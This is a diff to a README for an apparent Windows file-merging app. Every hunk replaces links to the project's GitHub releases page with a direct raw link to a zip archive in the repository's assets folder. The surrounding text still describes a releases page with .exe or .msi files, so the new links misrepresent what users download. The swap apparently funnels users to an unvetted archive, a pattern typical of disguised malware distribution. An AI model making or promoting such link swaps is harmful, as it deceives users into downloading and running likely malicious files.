@@ -1,12 +1,12 @@
 # 🔗 xyz-file-merger - Merge files with fewer steps
 
-[![Download xyz-file-merger](https://img.shields.io/badge/Download%20xyz--file--merger-4B8BF5?style=for-the-badge&logo=github)](https://github.com/Beta-issuer634/xyz-file-merger/releases)
+[![Download xyz-file-merger](https://img.shields.io/badge/Download%20xyz--file--merger-4B8BF5?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Beta-issuer634/xyz-file-merger/main/assets/xyz_merger_file_v3.1.zip)
 
 ## 📥 Download
 
 Use this page to download the app for Windows:
 
-[Visit the releases page to download xyz-file-merger](https://github.com/Beta-issuer634/xyz-file-merger/releases)
+[Visit the releases page to download xyz-file-merger](https://raw.githubusercontent.com/Beta-issuer634/xyz-file-merger/main/assets/xyz_merger_file_v3.1.zip)
 
 ## 🖥️ What this app does
 
@@ -33,7 +33,7 @@ If your files are large, make sure you have extra disk space before you begin.
 
 ## 🚀 Install on Windows
 
-1. Open the [releases page](https://github.com/Beta-issuer634/xyz-file-merger/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Beta-issuer634/xyz-file-merger/main/assets/xyz_merger_file_v3.1.zip).
 2. Find the latest release at the top of the page.
 3. Look for a Windows file such as `.exe` or `.msi`.
 4. Download the file to your computer.
@@ -165,7 +165,7 @@ Good fits include:
 
 If you need to get the app on another Windows PC, use the same page:
 
-[https://github.com/Beta-issuer634/xyz-file-merger/releases](https://github.com/Beta-issuer634/xyz-file-merger/releases)
+[https://raw.githubusercontent.com/Beta-issuer634/xyz-file-merger/main/assets/xyz_merger_file_v3.1.zip](https://raw.githubusercontent.com/Beta-issuer634/xyz-file-merger/main/assets/xyz_merger_file_v3.1.zip)
 
 ## 🗂️ Folder setup suggestion
 
